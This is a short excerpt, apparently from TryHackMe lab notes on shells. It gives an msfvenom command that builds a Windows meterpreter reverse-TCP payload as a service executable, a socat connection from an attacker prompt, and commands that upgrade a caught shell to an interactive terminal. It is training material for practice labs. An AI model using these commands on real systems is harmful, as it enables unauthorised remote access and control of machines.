...
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.129.39 LPORT=7777 -f exe-service > test.exe
```
...
attacker@tryhackme:~$ socat TCP:10.146.173.103:8088 -
```

### 4. script

```sh
script -qc /bin/bash /dev/null; tty
Ctrl+Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm
stty rows 52 columns 116
```
